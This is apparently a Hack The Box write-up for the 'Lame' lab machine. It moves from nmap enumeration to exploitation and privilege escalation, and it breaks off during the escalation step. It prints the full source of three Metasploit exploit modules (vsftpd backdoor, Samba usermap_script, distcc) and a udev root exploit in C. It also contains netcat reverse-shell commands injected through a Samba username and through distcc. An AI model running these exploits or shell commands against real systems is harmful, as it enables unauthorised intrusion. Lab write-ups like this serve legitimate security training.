# Hack_lame

# Hack the Box Ethical Hacking - Lame 
---

<img src="Lame.png">

**the targeted machine is Lame**

### nmap

First thing first, we run  a quick initial nmap scan to see whihc ports are open and which services are running on those ports
Run nmap to scan the machin.

`nmap -vvv -n -Pn -p0-65535 -oG allPolrs 10.129.114.132`

```bash
# Nmap 7.92 scan initiated Sat Apr  9 05:28:51 2022 as: nmap -vvv -n -Pn -p0-65535 -oG allPolrs 10.129.114.132
# Ports scanned: TCP(65536;0-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.129.114.132 () Status: Up
Host: 10.129.114.132 () Ports: 21/open/tcp//ftp///, 22/open/tcp//ssh///, 139/open/tcp//netbios-ssn///, 445/open/tcp//microsoft-ds///, 3632/open/tcp//distccd///   Ignored State: filtered (65531)
# Nmap done at Sat Apr  9 05:33:15 2022 -- 1 IP address (1 host up) scanned in 263.27 seconds

```

```
nmap -sCV -p21,22,139,445,3632 -oN tergeted 10.129.114.132
```

```nmap
# Nmap 7.92 scan initiated Sat Apr  9 05:42:36 2022 as: nmap -sCV -p21,22,139,445,3632 -oN tergeted 10.129.114.132
Nmap scan report for 10.129.114.132
Host is up (0.21s latency).

PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.16.11
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -59m41s, deviation: 2h49m43s, median: -2h59m42s
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2022-04-08T19:43:09-04:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Apr  9 05:43:32 2022 -- 1 IP address (1 host up) scanned in 55.13 seconds

```

Now we get back to the following result showing that these ports open

| Port | State | Service | Version |
|---|---|---|---|
|21|open|ftp|vsftpd 2.3.4|
|22|open|ssh|OpenSSH 4.7p1 Debian 8ubuntu1|
|139|open|Samba|smbd 3.X - 4.X|
|445|open|Samba|smbd 3.0.20-Debian|
|3632|open|distccd|distccd v1|

# Hack the Box Ethical Hacking - Lame 
---

## What is Enumeration?
**Enumeration belongs to the first phase of Ethical Hacking, i.e., “Information Gathering”. This is a process where the attacker establishes an active connection with the victim and tries to discover as many attack vectors as possible, which can be used to exploit the systems further.**

Now we get to enumerate more to determine if any of these services are either misconfigured or running vulnerable versions

### Port 21 vsftpd 2.3.4
A quick *searchsploit* tool shows us that this version is famously vulnerable to a backdoor command execution 

|Exploit Title|Path|
|---|---|
|vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)|unix/remote/17491.rb|

**Name**
VSFTPD v2.3.4 Backdoor Command Execution

**Description**
This module exploits a malicious backdoor that was added to the VSFTPD download archive. This backdoor was introdcued into the vsftpd-2.3.4.tar.gz archive between June 30th 2011 and July 1st 2011 according to the most recent information available. This backdoor was removed on July 3rd 2011.

```rb
##
# $Id: vsftpd_234_backdoor.rb 13099 2011-07-05 05:20:47Z hdm $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'VSFTPD v2.3.4 Backdoor Command Execution',
			'Description'    => %q{
					This module exploits a malicious backdoor that was added to the	VSFTPD download
					archive. This backdoor was introdcued into the vsftpd-2.3.4.tar.gz archive between
					June 30th 2011 and July 1st 2011 according to the most recent information
					available. This backdoor was removed on July 3rd 2011.
			},
			'Author'         => [ 'hdm', 'mc' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 13099 $',
			'References'     =>
				[
					[ 'URL', 'http://pastebin.com/AetT9sS5'],
					[ 'URL', 'http://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html' ],
				],
			'Privileged'     => true,
			'Platform'       => [ 'unix' ],
			'Arch'           => ARCH_CMD,
			'Payload'        =>
				{
					'Space'    => 2000,
					'BadChars' => '',
					'DisableNops' => true,
					'Compat'      =>
						{
							'PayloadType'    => 'cmd_interact',
							'ConnectionType' => 'find'
						}
				},
			'Targets'        =>
				[
					[ 'Automatic', { } ],
				],
			'DisclosureDate' => 'Jul 3 2011',
			'DefaultTarget' => 0))

		register_options([ Opt::RPORT(21) ], self.class)
	end

	def exploit

		nsock = self.connect(false, {'RPORT' => 6200}) rescue nil
		if nsock
			print_status("The port used by the backdoor bind listener is already open")
			handle_backdoor(nsock)
			return
		end

		# Connect to the FTP service port first
		connect

		banner = sock.get_once(-1, 30).to_s
		print_status("Banner: #{banner.strip}")

		sock.put("USER #{rand_text_alphanumeric(rand(6)+1)}:)\r\n")
		resp = sock.get_once(-1, 30).to_s
		print_status("USER: #{resp.strip}")

		if resp =~ /^530 /
			print_error("This server is configured for anonymous only and the backdoor code cannot be reached")
			disconnect
			return
		end

		if resp !~ /^331 /
			print_error("This server did not respond as expected: #{resp.strip}")
			disconnect
			return
		end

		sock.put("PASS #{rand_text_alphanumeric(rand(6)+1)}\r\n")

		# Do not bother reading the response from password, just try the backdoor
		nsock = self.connect(false, {'RPORT' => 6200}) rescue nil
		if nsock
			print_good("Backdoor service has been spawned, handling...")
			handle_backdoor(nsock)
			return
		end

		disconnect

	end

	def handle_backdoor(s)

		s.put("id\n")

		r = s.get_once(-1, 5).to_s
		if r !~ /uid=/
			print_error("The service on port 6200 does not appear to be a shell")
			disconnect(s)
			return
		end

		print_good("UID: #{r.strip}")

		s.put("nohup " + payload.encoded + " >/dev/null 2>&1")
		handler(s)
	end

end

```


**Now let's going to run the ftp with this command**
- Name: anonymous
- password: anything

`ftp 10.129.115.59`

We get back to the following result

```command
❯ ftp 10.129.115.59
Connected to 10.129.115.59.
220 (vsFTPd 2.3.4)
Name (10.129.115.59:dt): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
226 Directory send OK.
ftp> dir -a
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        65534        4096 Mar 17  2010 .
drwxr-xr-x    2 0        65534        4096 Mar 17  2010 ..
226 Directory send OK.
ftp> bye
221 Goodbye.
```

So let’s see if there is a Nmap script that already checks for that.

```command
ls /usr/share/nmap/scripts/ftp*
```
Output

```bash
.rw-r--r-- 4.5k root  8 Aug  2021 /usr/share/nmap/scripts/ftp-anon.nse
.rw-r--r-- 3.3k root  8 Aug  2021 /usr/share/nmap/scripts/ftp-bounce.nse
.rw-r--r-- 3.1k root  8 Aug  2021 /usr/share/nmap/scripts/ftp-brute.nse
.rw-r--r-- 3.3k root  8 Aug  2021 /usr/share/nmap/scripts/ftp-libopie.nse
.rw-r--r-- 3.3k root  8 Aug  2021 /usr/share/nmap/scripts/ftp-proftpd-backdoor.nse
.rw-r--r-- 3.8k root  8 Aug  2021 /usr/share/nmap/scripts/ftp-syst.nse
.rw-r--r-- 6.0k root  8 Aug  2021 /usr/share/nmap/scripts/ftp-vsftpd-backdoor.nse
.rw-r--r-- 5.9k root  8 Aug  2021 /usr/share/nmap/scripts/ftp-vuln-cve2010-4221.nse

```

Execute the script on port 21 of the target machine.

`nmap --script "ftp-vsftpd-backdoor" -p21 10.129.115.59`

```command
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-10 14:11 +03
Nmap scan report for 10.129.115.59
Host is up (0.71s latency).

PORT   STATE SERVICE
21/tcp open  ftp

Nmap done: 1 IP address (1 host up) scanned in 22.79 seconds
```
The script output shows that we’re not vulnerable to this vulnerability. Let’s move on to our second point of entry.

---

### Port 139 and 445 Samba 3.X - 4.X & 3.0.20-Debian

A quick *searchsploit* tool shows us that this version many is famously vulnerable
there are a lot of versions that are vulnerable. I chose this version 

|Exploit Title|Path|
|---|---|
|Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit) |unix/remote/16320.rb|

**Name**
Samba "username map script" Command Execution

**Description**
This module exploits a command execution vulerability in Samba versions 3.0.20 through 3.0.25rc3 
when using the non-default "username map script" configuration option. By specifying a username
containing shell meta characters, attackers can execute arbitrary commands. No authentication is needed to exploit this vulnerability since this option is used to map usernames prior to authentication!

```rb
##
# $Id: usermap_script.rb 10040 2010-08-18 17:24:46Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::SMB

	# For our customized version of session_setup_ntlmv1
	CONST = Rex::Proto::SMB::Constants
	CRYPT = Rex::Proto::SMB::Crypt

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Samba "username map script" Command Execution',
			'Description'    => %q{
					This module exploits a command execution vulerability in Samba
				versions 3.0.20 through 3.0.25rc3 when using the non-default
				"username map script" configuration option. By specifying a username
				containing shell meta characters, attackers can execute arbitrary
				commands.

				No authentication is needed to exploit this vulnerability since
				this option is used to map usernames prior to authentication!
			},
			'Author'         => [ 'jduck' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 10040 $',
			'References'     =>
				[
					[ 'CVE', '2007-2447' ],
					[ 'OSVDB', '34700' ],
					[ 'BID', '23972' ],
					[ 'URL', 'http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=534' ],
					[ 'URL', 'http://samba.org/samba/security/CVE-2007-2447.html' ]
				],
			'Platform'       => ['unix'],
			'Arch'           => ARCH_CMD,
			'Privileged'     => true, # root or nobody user
			'Payload'        =>
				{
					'Space'    => 1024,
					'DisableNops' => true,
					'Compat'      =>
						{
							'PayloadType' => 'cmd',
							# *_perl and *_ruby work if they are installed
							# mileage may vary from system to system..
						}
				},
			'Targets'        =>
				[
					[ "Automatic", { } ]
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'May 14 2007'))

		register_options(
			[
				Opt::RPORT(139)
			], self.class)
	end


	def exploit

		connect

		# lol?
		username = "/=`nohup " + payload.encoded + "`"
		begin
			simple.client.negotiate(false)
			simple.client.session_setup_ntlmv1(username, rand_text(16), datastore['SMBDomain'], false)
		rescue ::Timeout::Error, XCEPT::LoginError
			# nothing, it either worked or it didn't ;)
		end

		handler
	end

end
```

Let's use smbmap to access the SMB server

`smbmap -H 10.129.115.59`

- -H: HOST IP of host

```output
    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
 -----------------------------------------------------------------------------
     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com   
                     https://github.com/ShawnDEvans/smbmap

                                                                                                    
[+] IP: 10.129.115.59:445	Name: 10.129.115.59       	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	print$                                            	NO ACCESS	Printer Drivers
	tmp                                               	READ, WRITE	oh noes!
	opt                                               	NO ACCESS	
	IPC$                                              	NO ACCESS	IPC Service (lame server (Samba 3.0.20-Debian))
	ADMIN$                                            	NO ACCESS	IPC Service (lame server (Samba 3.0.20-Debian))
```

Now we get back the following result.
Interesting in we have to read, and write access to the *tmp* folder.

After collecting the information Let's use smbclient to access the SMB server.

`smbclient --no-pass //10.129.115.59/tmp`

```output
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> 
```

Let's make sure there is a response. For this, we use tcpdump tool.

Now we use the tool *tcpdump* and wait for a response 

`tcpdump -i tun0 icmp -n`

```output
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> logon "/=`nohup ping -c 1 10.10.16.11`"
Password: 
session setup failed: NT_STATUS_LOGON_FAILURE
```

```output
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
16:53:39.318980 IP 10.129.115.59 > 10.10.16.11: ICMP echo request, id 30249, seq 1, length 64
16:53:39.318992 IP 10.10.16.11 > 10.129.115.59: ICMP echo reply, id 30249, seq 1, length 64

```

Great now we see output there is *'listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes'*

---

### Port 3632 distccd

Let's go to use searchsploit tool and search that this service distccd is vulnerable

`searchsploit distcc`

|Exploit Title|Path|
|---|---|
|DistCC Daemon - Command Execution (Metasploit)|multiple/remote/9915.rb|

**Name**
DistCC Daemon Command Execution

**Description**
This module uses a documented security weakness to execute arbitrary commands on any system running distccd.

```rb
##
# $Id: distcc_exec.rb 9669 2010-07-03 03:13:45Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'


class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'DistCC Daemon Command Execution',
			'Description'    => %q{
				This module uses a documented security weakness to execute
				arbitrary commands on any system running distccd.

			},
			'Author'         => [ 'hdm' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 9669 $',
			'References'     =>
				[
					[ 'CVE', '2004-2687'],
					[ 'OSVDB', '13378' ],
					[ 'URL', 'http://distcc.samba.org/security.html'],

				],
			'Platform'       => ['unix'],
			'Arch'           => ARCH_CMD,
			'Privileged'     => false,
			'Payload'        =>
				{
					'Space'       => 1024,
					'DisableNops' => true,
					'Compat'      =>
						{
							'PayloadType' => 'cmd',
							'RequiredCmd' => 'generic perl ruby bash telnet',
						}
				},
			'Targets'        =>
				[
					[ 'Automatic Target', { }]
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Feb 01 2002'
			))

			register_options(
				[
					Opt::RPORT(3632)
				], self.class)
	end

	def exploit
		connect

		distcmd = dist_cmd("sh", "-c", payload.encoded);
		sock.put(distcmd)

		dtag = rand_text_alphanumeric(10)
		sock.put("DOTI0000000A#{dtag}\n")

		res = sock.get_once(24, 5)

		if !(res and res.length == 24)
			print_status("The remote distccd did not reply to our request")
			disconnect
			return
		end

		# Check STDERR
		res = sock.get_once(4, 5)
		res = sock.get_once(8, 5)
		len = [res].pack("H*").unpack("N")[0]

		return if not len
		if (len > 0)
			res = sock.get_once(len, 5)
			res.split("\n").each do |line|
				print_status("stderr: #{line}")
			end
		end

		# Check STDOUT
		res = sock.get_once(4, 5)
		res = sock.get_once(8, 5)
		len = [res].pack("H*").unpack("N")[0]

		return if not len
		if (len > 0)
			res = sock.get_once(len, 5)
			res.split("\n").each do |line|
				print_status("stdout: #{line}")
			end
		end

		handler
		disconnect
	end


	# Generate a distccd command
	def dist_cmd(*args)

		# Convince distccd that this is a compile
		args.concat(%w{# -c main.c -o main.o})

		# Set distcc 'magic fairy dust' and argument count
		res = "DIST00000001" + sprintf("ARGC%.8x", args.length)

		# Set the command arguments
		args.each do |arg|
			res << sprintf("ARGV%.8x%s", arg.length, arg)
		end

		return res
	end

end
```

We get back the following result. I saw References Indicating to there is CVE', '2004-2687. 
Let's go to google search.

After a search, we saw that this service is vulnerable to CVE 2004–2687 and there’s a Nmap script that can be used to exploit this vulnerability and run arbitrary commands on the target machine.

`find /usr/share/nmap/scripts/*dist* -type f 2>/dev/null`

```bash
local nmap = require "nmap"
local match = require "match"
local shortport = require "shortport"
local stdnse = require "stdnse"
local vulns = require "vulns"

description = [[
Detects and exploits a remote code execution vulnerability in the distributed
compiler daemon distcc. The vulnerability was disclosed in 2002, but is still
present in modern implementation due to poor configuration of the service.
]]

---
-- @usage
-- nmap -p 3632 <ip> --script distcc-exec --script-args="distcc-exec.cmd='id'"
--
-- @output
-- PORT     STATE SERVICE
-- 3632/tcp open  distccd
-- | distcc-exec:
-- |   VULNERABLE:
-- |   distcc Daemon Command Execution
-- |     State: VULNERABLE (Exploitable)
-- |     IDs:  CVE:CVE-2004-2687
-- |     Risk factor: High  CVSSv2: 9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C)
-- |     Description:
-- |       Allows executing of arbitrary commands on systems running distccd 3.1 and
-- |       earlier. The vulnerability is the consequence of weak service configuration.
-- |
-- |     Disclosure date: 2002-02-01
-- |     Extra information:
-- |
-- |     uid=118(distccd) gid=65534(nogroup) groups=65534(nogroup)
-- |
-- |     References:
-- |       https://distcc.github.io/security.html
-- |       https://nvd.nist.gov/vuln/detail/CVE-2004-2687
-- |_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-2687
--
-- @args cmd the command to run at the remote server
--

author = "Patrik Karlsson"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"exploit", "intrusive", "vuln"}


portrule = shortport.port_or_service(3632, "distcc")

local arg_cmd = stdnse.get_script_args(SCRIPT_NAME .. '.cmd') or "id"

local function fail(err) return stdnse.format_output(false, err) end

action = function(host, port)

  local distcc_vuln = {
    title = "distcc Daemon Command Execution",
    IDS = {CVE = 'CVE-2004-2687'},
    risk_factor = "High",
    scores = {
      CVSSv2 = "9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C)",
    },
    description = [[
Allows executing of arbitrary commands on systems running distccd 3.1 and
earlier. The vulnerability is the consequence of weak service configuration.
]],
    references = {
      'https://nvd.nist.gov/vuln/detail/CVE-2004-2687',
      'https://distcc.github.io/security.html',
    },
    dates = { disclosure = {year = '2002', month = '02', day = '01'}, },
    exploit_results = {},
  }

  local report = vulns.Report:new(SCRIPT_NAME, host, port)
  distcc_vuln.state = vulns.STATE.NOT_VULN

  local socket = nmap.new_socket()
  if ( not(socket:connect(host, port)) ) then
    return fail("Failed to connect to distcc server")
  end

  local cmds = {
    "DIST00000001",
    ("ARGC00000008ARGV00000002shARGV00000002-cARGV%08.8xsh -c " ..
    "'(%s)'ARGV00000001#ARGV00000002-cARGV00000006main.cARGV00000002" ..
    "-oARGV00000006main.o"):format(10 + #arg_cmd, arg_cmd),
    "DOTI00000001A\n",
  }

  for _, cmd in ipairs(cmds) do
    if ( not(socket:send(cmd)) ) then
      return fail("Failed to send data to distcc server")
    end
  end

  -- Command could have lots of output, need to cut it off somewhere. 4096 should be enough.
  local status, data = socket:receive_buf(match.pattern_limit("DOTO00000000", 4096), false)

  if ( status ) then
    local output = data:match("SOUT%w%w%w%w%w%w%w%w(.*)")
    if (output and #output > 0) then
      distcc_vuln.extra_info = stdnse.format_output(true, output)
      distcc_vuln.state = vulns.STATE.EXPLOIT
      return report:make_output(distcc_vuln)
    end
  end
end
```

after reading the file above file we use command next 

`nmap -p 3632 10.129.115.59 --script distcc-exec --script-args="distcc-exec.cmd='id'"`

```output
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-10 20:01 +03
Nmap scan report for 10.129.115.59
Host is up (0.30s latency).

PORT     STATE SERVICE
3632/tcp open  distccd
| distcc-exec: 
|   VULNERABLE:
|   distcc Daemon Command Execution
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2004-2687
|     Risk factor: High  CVSSv2: 9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C)
|       Allows executing of arbitrary commands on systems running distccd 3.1 and
|       earlier. The vulnerability is the consequence of weak service configuration.
|       
|     Disclosure date: 2002-02-01
|     Extra information:
|       
|     uid=1(daemon) gid=1(daemon) groups=1(daemon)
|   
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-2687
|       https://nvd.nist.gov/vuln/detail/CVE-2004-2687
|_      https://distcc.github.io/security.html

Nmap done: 1 IP address (1 host up) scanned in 1.95 seconds
```

# Hack the Box Ethical Hacking - Lame 
---
## Exploitation Samba

Now we add a listener on the attack machine.

```nc -nlvp 443```

Log into the smb client. As mentioned in the previous section, we’ll send shell metacharacters into the username with a reverse shell payload.

```output
smbclient --no-pass //10.129.115.59/tmp -c 'logon "/=`nohup nc -e /bin/bash 10.10.16.11 443"`'
```

The shell connects back to our attack machine and we have root! In this scenario, we didn’t need to escalate privileges.

```output
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.129.115.59.
Ncat: Connection from 10.129.115.59:43775.
whoami
root
pwd
/
script /dev/null -c bash
root@lame:/# find \-name root.txt | xargs cat 
4deedc34321c2**********************
root@lame:/# 
```

---

## Exploitation Distcc

We saw the service vulnerable. Let's go to use the Nmap script to send a reverse shell back to the attack machine

`nmap -p 3632 10.129.115.59 --script distcc-exec --script-args="distcc-exec.cmd='nc -e /bin/bash 10.10.16.11 443'"`

start a listener on the attack machine

`nc -nlvp 443`

```output
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.129.115.59.
Ncat: Connection from 10.129.115.59:60028.
id
uid=1(daemon) gid=1(daemon) groups=1(daemon)
script /dev/null -c bash
daemon@lame:/tmp$ whoami
daemon
daemon@lame:/tmp$ hostname
lame
daemon@lame:/tmp$ 
```

The shell connects back to our attack machine and we have a nonprivileged shell.
We’ll need to escalate privileges. 

# Hack the Box Ethical Hacking - Lame 
---

### Escalate privileges

```output
daemon@lame:/tmp$ lsb_release -a
No LSB modules are available.
Distributor ID:	Ubuntu
Description:	Ubuntu 8.04
Release:	8.04
Codename:	hardy
daemon@lame:/tmp$ uname -a
Linux lame 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
daemon@lame:/tmp$ 
```
So let's look forward to that version 2.6.24-16-server

`searchsploit 2.6 ubuntu 8`

```output
-------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                          |  Path
-------------------------------------------------------------------------------------------------------- ---------------------------------
Linux Kernel 2.4.x/2.6.x (CentOS 4.8/5.3 / RHEL 4.8/5.3 / SuSE 10 SP2/11 / Ubuntu 8.10) (PPC) - 'sock_s | linux/local/9545.c
Linux Kernel 2.6 (Debian 4.0 / Ubuntu / Gentoo) UDEV < 1.4.1 - Local Privilege Escalation (1)           | linux/local/8478.sh
Linux Kernel 2.6 (Gentoo / Ubuntu 8.10/9.04) UDEV < 1.4.1 - Local Privilege Escalation (2)              | linux/local/8572.c
Linux Kernel 2.6.20/2.6.24/2.6.27_7-10 (Ubuntu 7.04/8.04/8.10 / Fedora Core 10 / OpenSuse 11.1) - SCTP  | linux/remote/8556.c
Linux Kernel 2.6.24_16-23/2.6.27_7-10/2.6.28.3 (Ubuntu 8.04/8.10 / Fedora Core 10 x86-64) - 'set_select | linux_x86-64/local/9083.c
Linux Kernel 2.6.39 < 3.2.2 (Gentoo / Ubuntu x86/x64) - 'Mempodipper' Local Privilege Escalation (1)    | linux/local/18411.c
Linux Kernel < 2.6.34 (Ubuntu 10.10 x86) - 'CAP_SYS_ADMIN' Local Privilege Escalation (1)               | linux_x86/local/15916.c
Linux Kernel < 2.6.34 (Ubuntu 10.10 x86/x64) - 'CAP_SYS_ADMIN' Local Privilege Escalation (2)           | linux/local/15944.c
Linux Kernel < 2.6.36-rc1 (Ubuntu 10.04 / 2.6.32) - 'CAN BCM' Local Privilege Escalation                | linux/local/14814.c
Linux Kernel < 2.6.36.2 (Ubuntu 10.04) - 'Half-Nelson.c' Econet Privilege Escalation                    | linux/local/17787.c
Ubuntu < 15.10 - PT Chown Arbitrary PTs Access Via User Namespace Privilege Escalation                  | linux/local/41760.txt
-------------------------------------------------------------------------------------------------------- ---------------------------------
```

```c
/*
 * cve-2009-1185.c
 *
 * udev < 141 Local Privilege Escalation Exploit
 * Jon Oberheide <jon@oberheide.org>
 * http://jon.oberheide.org
 *
 * Information:
 *
 *   http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-1185
 *
 *   udev before 1.4.1 does not verify whether a NETLINK message originates 
 *   from kernel space, which allows local users to gain privileges by sending 
 *   a NETLINK message from user space.
 *
 * Notes:
 *   
 *   An alternate version of kcope's exploit.  This exploit leverages the 
 *   95-udev-late.rules functionality that is meant to run arbitrary commands 
 *   when a device is removed.  A bit cleaner and reliable as long as your 
 *   distro ships that rule file.
 *
 *   Tested on Gentoo, Intrepid, and Jaunty.
 *
 * Usage:
 *
 *   Pass the PID of the udevd netlink socket (listed in /proc/net/netlink, 
 *   usually is the udevd PID minus 1) as argv[1].
 *
 *   The exploit will execute /tmp/run as root so throw whatever payload you 
 *   want in there.
 */

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <linux/types.h>
#include <linux/netlink.h>

#ifndef NETLINK_KOBJECT_UEVENT
#define NETLINK_KOBJECT_UEVENT 15
#endif

int
main(int argc, char **argv)
{
	int sock;
	char *mp, *err;
	char message[4096];
	struct stat st;
	struct msghdr msg;
	struct iovec iovector;
	struct sockaddr_nl address;

	if (argc < 2) {
		err = "Pass the udevd netlink PID as an argument";
		printf("[-] Error: %s\n", err);
		exit(1);
	}

	if ((stat("/etc/udev/rules.d/95-udev-late.rules", &st) == -1) &&
	    (stat("/lib/udev/rules.d/95-udev-late.rules", &st) == -1)) {
		err = "Required 95-udev-late.rules not found";
		printf("[-] Error: %s\n", err);
		exit(1);
	}

	if (stat("/tmp/run", &st) == -1) {
		err = "/tmp/run does not exist, please create it";
		printf("[-] Error: %s\n", err);
		exit(1);
	}
	system("chmod +x /tmp/run");

	memset(&address, 0, sizeof(address));
	address.nl_family = AF_NETLINK;
	address.nl_pid = atoi(argv[1]);
	address.nl_groups = 0;

	msg.msg_name = (void*)&address;
	msg.msg_namelen = sizeof(address);
	msg.msg_iov = &iovector;
	msg.msg_iovlen = 1;

	sock = socket(AF_NETLINK, SOCK_DGRAM, NETLINK_KOBJECT_UEVENT);
	bind(sock, (struct sockaddr *) &address, sizeof(address));

	mp = message;
	mp += sprintf(mp, "remove@/d") + 1;
	mp += sprintf(mp, "SUBSYSTEM=block") + 1;
	mp += sprintf(mp, "DEVPATH=/dev/foo") + 1;
	mp += sprintf(mp, "TIMEOUT=10") + 1;
	mp += sprintf(mp, "ACTION=remove") +1;
	mp += sprintf(mp, "REMOVE_CMD=/tmp/run") +1;

	iovector.iov_base = (void*)message;
	iovector.iov_len = (int)(mp-message);

	sendmsg(sock, &msg, 0);

	close(sock);

	return 0;
}

// milw0rm.com [2009-04-30]
```

```output
daemon@lame:/tmp$ ps -aux
Warning: bad ps syntax, perhaps a bogus '-'? See http://procps.sf.net/faq.html
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.3   2844  1692 ?        Ss   03:22   0:01 /sbin/init
root         2  0.0  0.0      0     0 ?        S<   03:22   0:00 [kthreadd]
root         3  0.0  0.0      0     0 ?        S<   03:22   0:00 [migration/0]
root         4  0.0  0.0      0     0 ?        S<   03:22   0:00 [ksoftirqd/0]
root         5  0.0  0.0      0     0 ?        S<   03:22   0:00 [watchdog/0]
root         6  0.0  0.0      0     0 ?        S<   03:22   0:00 [events/0]
root         7  0.0  0.0      0     0 ?        S<   03:22   0:00 [khelper]
root        41  0.0  0.0      0     0 ?        S<   03:22   0:00 [kblockd/0]
root        64  0.0  0.0      0     0 ?        S<   03:22   0:00 [kseriod]
root       182  0.0  0.0      0     0 ?        S    03:22   0:00 [pdflush]
root       183  0.0  0.0      0     0 ?        S    03:22   0:00 [pdflush]
root       184  0.0  0.0      0     0 ?        S<   03:22   0:00 [kswapd0]
root       225  0.0  0.0      0     0 ?        S<   03:22   0:00 [aio/0]
root      1266  0.0  0.0      0     0 ?        S<   03:22   0:00 [ksnapd]
root      1457  0.0  0.0      0     0 ?        S<   03:22   0:00 [ata/0]
root      1460  0.0  0.0      0     0 ?        S<   03:22   0:00 [ata_aux]
root      1469  0.0  0.0      0     0 ?        S<   03:22   0:00 [scsi_eh_0]
root      1473  0.0  0.0      0     0 ?        S<   03:22   0:00 [scsi_eh_1]
